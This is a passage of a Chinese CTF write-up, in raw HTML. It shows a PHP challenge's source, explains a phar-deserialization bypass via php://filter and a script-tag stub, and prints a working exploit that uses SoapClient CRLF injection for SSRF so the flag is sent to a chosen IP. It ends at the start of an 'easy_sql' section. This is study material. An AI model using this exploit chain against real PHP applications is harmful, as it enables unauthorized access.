punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// 小于 200 kb</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$allowedExts</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Check</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"错误：: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"."</span> <span class="token punctuation">.</span> <span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"文件存储在: "</span> <span class="token punctuation">.</span> <span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"."</span> <span class="token punctuation">.</span> <span class="token variable">$extension</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"非法的文件格式"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>   <span class="token punctuation">}</span></code></pre><p>func.php接受一个url参数，参数经过一个很狠的正则，会去你上传的目录找你上传的文件，获取MIME返回。</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># func.php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"submit"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Go away!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMIME</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;p>Your file type is '$file' &lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>class.php这里的File的__wakeup函数很异常，预计就是题目考点了，作用是创建一个类的新实例，给出的参数将传递到类的构造函数。</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#class.php</span><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$type</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string">"Check"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_name</span> <span class="token operator">=</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$class</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">newInstanceArgs</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">getMIME</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">type</span> <span class="token operator">=</span> <span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">finfo_close</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">type</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Check</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_name</span> <span class="token operator">=</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">"&lt;?"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&amp;lt;? in contents!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>接下来这个admin.php，需要一个ssrf然后，之后会触发getflag函数把flag发到你服务器上</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#admin.php</span><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Ad</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$ip</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$port</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$clazz</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func3</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$instance</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg3</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$clazz</span><span class="token punctuation">,</span> <span class="token variable">$func1</span><span class="token punctuation">,</span> <span class="token variable">$func2</span><span class="token punctuation">,</span> <span class="token variable">$func3</span><span class="token punctuation">,</span> <span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">,</span> <span class="token variable">$arg3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ip</span> <span class="token operator">=</span> <span class="token variable">$ip</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">clazz</span> <span class="token operator">=</span> <span class="token variable">$clazz</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func1</span> <span class="token operator">=</span> <span class="token variable">$func1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func2</span> <span class="token operator">=</span> <span class="token variable">$func2</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func3</span> <span class="token operator">=</span> <span class="token variable">$func3</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg1</span> <span class="token operator">=</span> <span class="token variable">$arg1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg2</span> <span class="token operator">=</span> <span class="token variable">$arg2</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg3</span> <span class="token operator">=</span> <span class="token variable">$arg3</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$reflect</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">clazz</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">instance</span> <span class="token operator">=</span> <span class="token variable">$reflect</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">newInstanceArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$reflectionMethod</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionMethod</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">clazz</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$reflectionMethod</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">instance</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$reflectionMethod</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionMethod</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">clazz</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$reflectionMethod</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">instance</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$reflectionMethod</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionMethod</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">clazz</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$reflectionMethod</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">instance</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ip</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">port</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//使用你自己的服务器监听一个确保可以收到消息的端口来获取flag</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//你用来获取flag的服务器ip</span>        <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//你用来获取flag的服务器端口</span>        <span class="token variable">$clazz</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'clazz'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$func1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'func1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$func2</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'func2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$func3</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'func3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$arg1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'arg1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$arg2</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'arg2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$arg2</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'arg3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ad</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$clazz</span><span class="token punctuation">,</span> <span class="token variable">$func1</span><span class="token punctuation">,</span> <span class="token variable">$func2</span><span class="token punctuation">,</span> <span class="token variable">$func3</span><span class="token punctuation">,</span> <span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">,</span> <span class="token variable">$arg3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$admin</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"You r not admin!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>经过大致分析，需要点： ssrf、触发反序列化、上传内容不能有&lt;?、不能直接用phar等已见的协议触发。</p><p>这里正则绕过：<code>php://filter/resource=phar://phar.phar</code></p><p>ssrf: 因为可以实例化任何类，然而题目并没有给什么有用的，自然想到SoapClient</p><p>上传内容不能有&lt;?绕过： 结合前面两题的trick<code>&lt;script language="php"&gt;__HALT_COMPILER();&lt;/script&gt;</code></p><p>触发反序列化：<code>$this-&gt;type = finfo_file($finfo, $this-&gt;file_name);</code></p><p>那么这些点全部都有了，直接贴exp吧。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'&lt;script language="php">__HALT_COMPILER();&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string">"SoapClient"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$target</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/admin.php";</span>        <span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string">'admin=&amp;ip=111.111.111.111&amp;port=1111&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span><span class="token punctuation">.</span> <span class="token string">"\r\n"</span><span class="token punctuation">;</span>        <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_name</span>  <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token keyword">null</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span>                  <span class="token string">'user_agent'</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'Content-Length: '</span><span class="token punctuation">.</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'^^^^'</span><span class="token punctuation">.</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                  <span class="token string">'uri'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'hello'</span><span class="token punctuation">)</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>把生成的test.phar改成test.jpg上传，然后访问<code>php://filter/resource=phar://upload/2bc454e1fc8129de63d3c034e5c0c24f/0412c29576c708cf0155e8de242169b1.jpg</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819102450-85b206be-c228-1.png" alt="image.png"></p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>这题运维出现了问题，导致出现源码泄露，扫描源码如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>    <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">global</span> <span class="token variable">$MysqlLink</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//GetPara();</span>    <span class="token variable">$MysqlLink</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token variable">$datauser</span><span class="token punctuation">,</span><span class="token variable">$datapass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Mysql Connect Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$selectDB</span> <span class="token operator">=</span> <span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$dataName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$selectDB</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Choose Database Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//die();</span>    <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token 